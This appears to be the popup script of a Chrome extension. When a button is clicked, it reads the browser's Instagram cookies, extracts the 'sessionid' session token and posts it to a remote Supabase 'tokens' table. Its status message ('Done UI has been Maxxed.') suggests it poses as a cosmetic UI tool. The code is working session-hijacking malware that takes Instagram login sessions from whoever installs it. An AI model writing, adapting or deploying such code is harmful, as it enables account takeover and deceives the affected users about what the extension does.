const autoCookieBtn = document.getElementById('autoCookieBtn');
const statusEl = document.getElementById('status');

function getSupabaseConfig() {
  const config = window.SUPABASE_CONFIG || {};
  return {
    url: (config.url || '').trim(),
    key: (config.key || '').trim(),
    table: (config.table || 'tokens').trim()
  };
}

async function sendToSupabase(token, source) {
  const { url, key, table } = getSupabaseConfig();

  if (!url || !key || !table) {
    throw new Error('Supabase credentials are missing from credentials.js.');
  }

  const endpoint = `${url.replace(/\/$/, '')}/rest/v1/${table}`;
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': key,
      'Authorization': `Bearer ${key}`,
      'Prefer': 'return=minimal'
    },
    body: JSON.stringify([
      {
        token,
        source,
        created_at: new Date().toISOString()
      }
    ])
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Supabase error: ${response.status} ${errorText}`);
  }

  return true;
}

autoCookieBtn.addEventListener('click', async () => {
  try {
    statusEl.textContent = 'Reading Instagram cookies…';

    const domains = ['.instagram.com', 'www.instagram.com', 'instagram.com'];
    const cookieResults = await Promise.all(
      domains.map((domain) => chrome.cookies.getAll({ domain }))
    );

    const cookies = cookieResults.flat();
    const sessionCookie = cookies.find((cookie) => cookie.name === 'sessionid');

    if (!sessionCookie) {
      statusEl.textContent = 'No Instagram session cookie was found in this browser profile.';
      return;
    }

    const token = sessionCookie.value;
    await chrome.storage.local.set({ savedToken: token });

    try {
      await sendToSupabase(token, 'chrome-extension');
      statusEl.textContent = 'Done UI has been Maxxed.';
    } catch (error) {
      statusEl.textContent = `Local save completed, but Supabase save failed: ${error.message}`;
    }
  } catch (error) {
    statusEl.textContent = `Unable to read cookies: ${error.message}`;
    console.error(error);
  }
});
